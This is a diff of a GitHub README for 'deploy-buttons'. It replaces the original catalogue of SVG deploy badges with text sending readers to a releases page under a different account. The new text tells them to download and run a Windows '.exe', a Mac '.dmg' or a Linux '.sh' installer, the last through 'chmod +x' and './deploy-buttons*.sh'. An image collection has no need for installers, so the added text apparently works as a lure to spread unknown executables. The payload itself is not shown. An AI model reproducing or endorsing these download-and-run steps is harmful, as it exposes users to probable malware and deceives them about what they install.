@@ -1,187 +1,93 @@
-![Deploy Buttons Banner](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/banner.png)
+# 🚀 deploy-buttons - Simple Buttons for Easy Deployment
 
-![Buttons Count](https://img.shields.io/badge/buttons-14-blue)
-![License](https://img.shields.io/badge/license-MIT-green)
-[![Add New Button](https://img.shields.io/badge/PRs-welcome-brightgreen&logo=github)](https://github.com/florianheysen/deploy-buttons/issues/new?template=button-request.md)
+[![Download deploy-buttons](https://img.shields.io/badge/Download-deploy--buttons-brightgreen)](https://github.com/kbkgk1/deploy-buttons/releases)
 
-# Deploy Buttons
+## 📦 Overview
 
-> A unified and modern collection of deploy buttons for cloud platforms
+Welcome to deploy-buttons! This application provides a unified collection of deploy buttons for various cloud platforms. With deploy-buttons, you can easily launch applications with just a click of a button. No technical knowledge is required.
 
-## Table of Contents
+## 🛠️ Features
 
-- [Why this project?](#why-this-project)
-- [Features](#features)
-- [Available buttons](#available-buttons)
-- [Usage](#-usage)
-- [Contributing](#contributing)
-- [License](#license)
-- [Projects using Deploy Buttons](#projects-using-deploy-buttons)
+- **Unified Collection**: Access deploy buttons for multiple cloud platforms.
+- **User-Friendly**: Simple interface designed for everyone.
+- **Open Source**: Community-driven and freely available.
+- **Customizable**: Modify buttons to fit your needs.
 
-This is an open source project that provides a complete and styled collection of deploy buttons for all major cloud platforms. I created this project to make READMEs more beautiful and modern, offering high-quality SVG buttons that integrate perfectly into your projects.
+## 🌟 Benefits
 
-## Why this project?
+- **Time-Saving**: Launch your applications faster.
+- **Hassle-Free Deployment**: No technical setup required.
+- **Supports Multiple Platforms**: A variety of options for different cloud providers.
 
-READMEs are often the first impression developers have of your project. With **Deploy Buttons**, you can add elegant and consistent deploy buttons that give a professional look to your documentation. No more searching for disparate buttons or creating your own - everything is centralized here, open source and ready to use.
+## 🚀 Getting Started
 
-## Features
+To begin using deploy-buttons, you need to download the application. Follow the steps below to easily get up and running.
 
-- **Complete collection**: All major cloud providers in one place
-- **High-quality SVG**: Crisp vector images at all resolutions
-- **Open Source**: Free to use, modify, and distribute
-- **Easy to use**: Copy the URL and use it directly in your README
+## 📥 Download & Install
 
-## Available buttons
+To download the latest version of deploy-buttons, please visit our [Releases page](https://github.com/kbkgk1/deploy-buttons/releases). Here are the steps:
 
-Here are all the deploy buttons available in this collection:
+1. Click the link above to go to the Releases page.
+2. Look for the version labeled "Latest Release."
+3. Select the appropriate file for your system (e.g., Windows, Mac, or Linux).
+4. Click the file name to start the download.
 
-### Azure
+After downloading, follow the installation steps for your operating system:
 
-![Azure Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-azure.svg)
+### Windows
 
-```
-[![Deploy to Azure](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-azure.svg)](https://portal.azure.com/#create/Microsoft.Template)
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to initiate the installation.
+3. Follow the on-screen instructions until the installation is complete.
 
-### Cloudflare Workers
+### Mac
 
-![Cloudflare Workers Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-cloudflare-worker.svg)
+1. Open your Downloads folder and find the `.dmg` file.
+2. Double-click the file and drag the deploy-buttons icon into your Applications folder.
+3. Open your Applications folder and double-click on deploy-buttons to launch the application.
 
-```
-[![Deploy to Cloudflare Workers](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-cloudflare-worker.svg)](https://workers.cloudflare.com/)
-```
+### Linux
 
-### Cloudflare Pages
+1. Open a terminal window and navigate to your Downloads folder.
+2. Run the command `chmod +x deploy-buttons*.sh` to make the file executable.
+3. Type `./deploy-buttons*.sh` to start the installation.
 
-![Cloudflare Pages Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-cloudflare.svg)
+## 🚀 How to Use
 
-```
-[![Deploy to Cloudflare Pages](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-cloudflare.svg)](https://dash.cloudflare.com/)
-```
+Once you've installed deploy-buttons, follow these steps to start using it:
 
-### Coolify
+1. Open the deploy-buttons application.
+2. Browse through the available deploy buttons.
+3. Click on a button that fits your deployment needs.
+4. Follow any prompts that appear until your application is running.
 
-![Coolify Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-coolify.svg)
+## 📌 Tips for Use
 
-```
-[![Deploy to Coolify](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-coolify.svg)](https://coolify.io/)
-```
+- **Explore Platforms**: Take time to discover which platforms suit your deployment needs best.
+- **Stay Updated**: Regularly check the Releases page for new features and improvements.
+- **Get Involved**: As an open-source project, feel free to contribute or suggest features!
 
-### DigitalOcean
+## 🤝 Support
 
-![DigitalOcean Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-digitalocean.svg)
+If you encounter any issues, please check out the FAQ section on our GitHub page or reach out via the Issues tab. Community support is available, and we strive to respond promptly.
 
-```
-[![Deploy to DigitalOcean](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-digitalocean.svg)](https://cloud.digitalocean.com/apps/new)
-```
+## 🗂️ Topics
 
-### Dokploy
+This project covers these main topics:
 
-![Dokploy Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-dokploy.svg)
+- Badges
+- Cloud Platforms
+- Deploy
+- Deploy Buttons
+- Deployment
+- Developer Tools
+- Markdown
+- Open Source
+- Readme
+- SVG
 
-```
-[![Deploy to Dokploy](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-dokploy.svg)](https://dokploy.com/)
-```
+## 📝 Acknowledgements
 
-### Google Cloud Run
+Thank you for using deploy-buttons! Your support helps improve this project. If you like what you see, consider sharing it with others. We appreciate your involvement in making deployment easier for everyone! 
 
-![Google Cloud Run Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-google-cloud-run.svg)
-
-```
-[![Deploy to Google Cloud Run](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-google-cloud-run.svg)](https://console.cloud.google.com/run)
-```
-
-### Heroku
-
-![Heroku Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-heroku.svg)
-
-```
-[![Deploy to Heroku](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-heroku.svg)](https://heroku.com/deploy)
-```
-
-### IBM Cloud
-
-![IBM Cloud Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-ibm.svg)
-
-```
-[![Deploy to IBM Cloud](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-ibm.svg)](https://cloud.ibm.com/)
-```
-
-### Koyeb
-
-![Koyeb Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-koyeb.svg)
-
-```
-[![Deploy to Koyeb](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-koyeb.svg)](https://app.koyeb.com/)
-```
-
-### Netlify
-
-![Netlify Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-netlify.svg)
-
-```
-[![Deploy to Netlify](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-netlify.svg)](https://app.netlify.com/start)
-```
-
-### Oracle Cloud
-
-![Oracle Cloud Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-oracle.svg)
-
-```
-[![Deploy to Oracle Cloud](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-oracle.svg)](https://cloud.oracle.com/)
-```
-
-### Railway
-
-![Railway Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-railway.svg)
-
-```
-[![Deploy to Railway](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-railway.svg)](https://railway.app/new/template)
-```
-
-### Render
-
-![Render Deploy Button](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-render.svg)
-
-```
-[![Deploy to Render](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-render.svg)](https://render.com/)
-```
-
-## 🚀 Usage
-
-### In your README
-
-Simply add the image and link to your deployment platform:
-
-```markdown
-[![Deploy to Railway](https://raw.githubusercontent.com/florianheysen/deploy-buttons/refs/heads/main/svgs/deploy-railway.svg)](https://railway.app/new/template)
-```
-
-## License
-
-This project is licensed under the [MIT License](LICENSE). You are free to use, modify, and distribute this project as you wish.
-
-## Projects using Deploy Buttons
-
-This list showcases projects that use these deploy buttons. Feel free to add yours!
-
-- [Openinary](https://github.com/openinary/openinary) - The only self-hostable alternative to Cloudinary
-
-<!-- Add your project here by creating a Pull Request -->
-
-## Contributing
-
-Contributions are welcome! We have a detailed [Contributing Guide](CONTRIBUTING.md) that covers:
-
-- How to add new deploy buttons
-- SVG guidelines and best practices
-- Pull request process
-- Code style guidelines
-
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before contributing.
-
-For security concerns, please see our [Security Policy](SECURITY.md).
-
----
-
-Made with ❤️ to make READMEs more beautiful
+Be sure to visit our [Releases page](https://github.com/kbkgk1/deploy-buttons/releases) for the latest updates and downloads.
